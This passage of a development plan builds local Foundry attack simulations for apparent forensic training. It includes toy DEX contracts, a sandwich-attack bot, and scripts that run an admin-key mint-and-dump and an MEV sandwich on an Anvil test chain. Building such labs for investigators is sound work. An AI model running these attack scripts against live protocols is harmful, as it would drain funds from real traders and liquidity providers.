contract SimpleDEX {
    MockERC20 public token;
    uint256 public tokenReserve;
    uint256 public ethReserve;

    event Swap(address indexed trader, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event AddLiquidity(address indexed provider, uint256 tokenAmount, uint256 ethAmount);

    constructor(address _token) {
        token = MockERC20(_token);
    }

    function addLiquidity(uint256 tokenAmount) external payable {
        token.transferFrom(msg.sender, address(this), tokenAmount);
        tokenReserve += tokenAmount;
        ethReserve += msg.value;
        emit AddLiquidity(msg.sender, tokenAmount, msg.value);
    }

    function swapTokenForETH(uint256 tokenAmount) external returns (uint256 ethOut) {
        ethOut = (tokenAmount * ethReserve) / (tokenReserve + tokenAmount);
        token.transferFrom(msg.sender, address(this), tokenAmount);
        tokenReserve += tokenAmount;
        ethReserve -= ethOut;
        payable(msg.sender).transfer(ethOut);
        emit Swap(msg.sender, address(token), address(0), tokenAmount, ethOut);
    }

    receive() external payable {}
}
```

- [ ] **Step 3: Create RunAll.s.sol for admin-key-abuse**

`simulations/scenarios/admin-key-abuse/script/RunAll.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../src/victim/GovernanceToken.sol";
import "../src/victim/SimpleDEX.sol";

contract RunAll is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");

        // Phase 1: Deploy protocol
        vm.startBroadcast(deployerKey);
        GovernanceToken govToken = new GovernanceToken("GovToken", "GOV", 1_000_000e18);
        SimpleDEX dex = new SimpleDEX(address(govToken));

        // Seed DEX liquidity
        govToken.approve(address(dex), 500_000e18);
        dex.addLiquidity{value: 100 ether}(500_000e18);

        console.log("GovToken:", address(govToken));
        console.log("DEX:", address(dex));
        vm.stopBroadcast();

        // Phase 2: Normal activity
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        // User buys some tokens from DEX (small swap)
        vm.stopBroadcast();

        // Phase 3: Attack — compromise admin key, transfer ownership, mint, dump
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");

        // Attacker gets deployer to transfer ownership (simulates key compromise)
        vm.startBroadcast(deployerKey);
        govToken.transferOwnership(vm.addr(attackerKey));
        vm.stopBroadcast();

        // Attacker mints massive supply and dumps
        vm.startBroadcast(attackerKey);
        govToken.mint(vm.addr(attackerKey), 10_000_000e18);
        govToken.approve(address(dex), 10_000_000e18);
        dex.swapTokenForETH(5_000_000e18);
        console.log("Admin key abuse complete. ETH stolen.");
        vm.stopBroadcast();
    }
}
```

- [ ] **Step 4: Create client handover**

`simulations/scenarios/admin-key-abuse/client/manifest.json`:

```json
{
  "investigation_name": "Admin Key Abuse",
  "chain_id": 31337,
  "rpc_url": "http://127.0.0.1:8545",
  "contracts": [
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "GovernanceToken",
      "role": "victim",
      "abi_file": "abis/GovernanceToken.json"
    },
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "SimpleDEX",
      "role": "dependency",
      "abi_file": "abis/SimpleDEX.json"
    }
  ],
  "block_range": {
    "from": "FILL_AFTER_DEPLOY",
    "to": "FILL_AFTER_DEPLOY"
  },
  "notes": "Ownership of our governance token was transferred without authorization. Attacker minted tokens and dumped on our DEX."
}
```

- [ ] **Step 5: Commit**

```bash
git add simulations/scenarios/admin-key-abuse/
git commit -m "feat: admin-key-abuse scenario with GovernanceToken, SimpleDEX, ownership transfer attack"
```

---

### Task 5: MEV Sandwich Scenario

**Files:**
- Create: SimpleDEX (AMM) for sandwich scenario
- Create: attacker sandwich bot contract

- [ ] **Step 1: Create SandwichDEX.sol**

`simulations/scenarios/mev-sandwich/src/victim/SandwichDEX.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

/**
 * @title SandwichDEX
 * @notice Simple constant-product AMM. Victims submit swaps here.
 *         MEV bot front-runs and back-runs in the same block.
 */
contract SandwichDEX {
    MockERC20 public tokenA;
    MockERC20 public tokenB;
    uint256 public reserveA;
    uint256 public reserveB;

    event Swap(address indexed trader, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event AddLiquidity(address indexed provider, uint256 amountA, uint256 amountB);

    constructor(address _tokenA, address _tokenB) {
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
    }

    function addLiquidity(uint256 amountA, uint256 amountB) external {
        tokenA.transferFrom(msg.sender, address(this), amountA);
        tokenB.transferFrom(msg.sender, address(this), amountB);
        reserveA += amountA;
        reserveB += amountB;
        emit AddLiquidity(msg.sender, amountA, amountB);
    }

    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
        if (tokenIn == address(tokenA)) {
            amountOut = (amountIn * reserveB) / (reserveA + amountIn);
            tokenA.transferFrom(msg.sender, address(this), amountIn);
            tokenB.transfer(msg.sender, amountOut);
            reserveA += amountIn;
            reserveB -= amountOut;
            emit Swap(msg.sender, address(tokenA), address(tokenB), amountIn, amountOut);
        } else {
            amountOut = (amountIn * reserveA) / (reserveB + amountIn);
            tokenB.transferFrom(msg.sender, address(this), amountIn);
            tokenA.transfer(msg.sender, amountOut);
            reserveB += amountIn;
            reserveA -= amountOut;
            emit Swap(msg.sender, address(tokenB), address(tokenA), amountIn, amountOut);
        }
    }
}
```

- [ ] **Step 2: Create SandwichBot.sol**

`simulations/scenarios/mev-sandwich/src/attacker/SandwichBot.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

interface IDEX {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}

/**
 * @title SandwichBot
 * @notice Executes front-run and back-run swaps around a victim's trade.
 *         All 3 transactions land in the same block on Anvil.
 */
contract SandwichBot {
    address public owner;
    IDEX public dex;

    constructor(address _dex) {
        owner = msg.sender;
        dex = IDEX(_dex);
    }

    function frontrun(address tokenIn, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        MockERC20(tokenIn).approve(address(dex), amount);
        dex.swap(tokenIn, amount);
    }

    function backrun(address tokenIn, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        MockERC20(tokenIn).approve(address(dex), amount);
        dex.swap(tokenIn, amount);
    }

    function withdrawAll(address token) external {
        require(msg.sender == owner, "Not owner");
        MockERC20 t = MockERC20(token);
        t.transfer(owner, t.balanceOf(address(this)));
    }
}
```

- [ ] **Step 3: Create RunAll.s.sol for mev-sandwich**

`simulations/scenarios/mev-sandwich/script/RunAll.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../../shared/contracts/MockERC20.sol";
import "../src/victim/SandwichDEX.sol";
import "../src/attacker/SandwichBot.sol";

contract RunAll is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");

        // Phase 1: Deploy
        vm.startBroadcast(deployerKey);
        MockERC20 tokenA = new MockERC20("Token A", "TKA", 18);
        MockERC20 tokenB = new MockERC20("Token B", "TKB", 18);
        SandwichDEX dex = new SandwichDEX(address(tokenA), address(tokenB));

        tokenA.mint(msg.sender, 1_000_000e18);
        tokenB.mint(msg.sender, 1_000_000e18);
        tokenA.approve(address(dex), 500_000e18);
        tokenB.approve(address(dex), 500_000e18);
        dex.addLiquidity(500_000e18, 500_000e18);

        console.log("DEX:", address(dex));
        console.log("TokenA:", address(tokenA));
        console.log("TokenB:", address(tokenB));
        vm.stopBroadcast();

        // Phase 2: Normal activity
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);
        tokenA.mint(msg.sender, 10_000e18);
        tokenA.approve(address(dex), 1_000e18);
        dex.swap(address(tokenA), 1_000e18);
        vm.stopBroadcast();

        // Phase 3: Sandwich attack (same block in Anvil)
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        uint256 victimKey = vm.envUint("USER2_KEY");

        // Deploy bot
        vm.startBroadcast(attackerKey);
        SandwichBot bot = new SandwichBot(address(dex));
        tokenA.mint(address(bot), 50_000e18);
        tokenB.mint(address(bot), 50_000e18);
        vm.stopBroadcast();

        // Front-run: bot buys tokenB with tokenA
        vm.startBroadcast(attackerKey);
        bot.frontrun(address(tokenA), 50_000e18);
        vm.stopBroadcast();

        // Victim swap: user swaps tokenA for tokenB (gets worse price)
        vm.startBroadcast(victimKey);
        tokenA.mint(msg.sender, 5_000e18);
        tokenA.approve(address(dex), 5_000e18);
        dex.swap(address(tokenA), 5_000e18);
        vm.stopBroadcast();

        // Back-run: bot sells tokenB for tokenA (profit)
        vm.startBroadcast(attackerKey);
        bot.backrun(address(tokenB), tokenB.balanceOf(address(bot)));
        bot.withdrawAll(address(tokenA));
        bot.withdrawAll(address(tokenB));
        console.log("Sandwich attack complete");
        vm.stopBroadcast();
    }
}
```

- [ ] **Step 4: Create client handover**

`simulations/scenarios/mev-sandwich/client/manifest.json`:

```json
{
  "investigation_name": "MEV Sandwich Attack",
  "chain_id": 31337,
  "rpc_url": "http://127.0.0.1:8545",
  "contracts": [
    {
      "address": "FILL_AFTER_DEPLOY",
      "name": "SandwichDEX",
      "role": "victim",
      "abi_file": "abis/SandwichDEX.json"
    }
  ],
  "block_range": {
    "from": "FILL_AFTER_DEPLOY",
    "to": "FILL_AFTER_DEPLOY"
  },
  "notes": "Users are reporting getting much worse swap rates than expected. We suspect front-running."
}
```

- [ ] **Step 5: Compile all scenarios**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary/simulations
forge build
```

Expected: All contracts compile without errors

- [ ] **Step 6: Commit**

```bash
git add simulations/scenarios/mev-sandwich/
git commit -m "feat: mev-sandwich scenario with SandwichDEX, SandwichBot, front-run/back-run scripts"
```

---

### Task 6: Scenario Test — Verify on Anvil

**Files:** None new. This task runs existing scripts against Anvil.

- [ ] **Step 1: Start Anvil in background**

```bash
anvil --block-time 1 &
ANVIL_PID=$!
```

- [ ] **Step 2: Run reentrancy-drain scenario**

```bash
cd /mnt/c/Users/aswat/OneDrive/Desktop/Projects/Project_Hail_Mary/simulations
DEPLOYER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
USER1_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
USER2_KEY=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a \
USER3_KEY=0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6 \
ATTACKER_KEY=0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a \
forge script scenarios/reentrancy-drain/script/RunAll.s.sol --rpc-url http://127.0.0.1:8545 --broadcast
```

Expected: Script runs successfully, vault is drained

- [ ] **Step 3: Kill Anvil**

```bash
kill $ANVIL_PID
```

- [ ] **Step 4: Commit any generated artifacts**

```bash
git add simulations/
git commit -m "feat: all 4 simulation scenarios verified — reentrancy, flash loan, admin abuse, MEV sandwich"
```
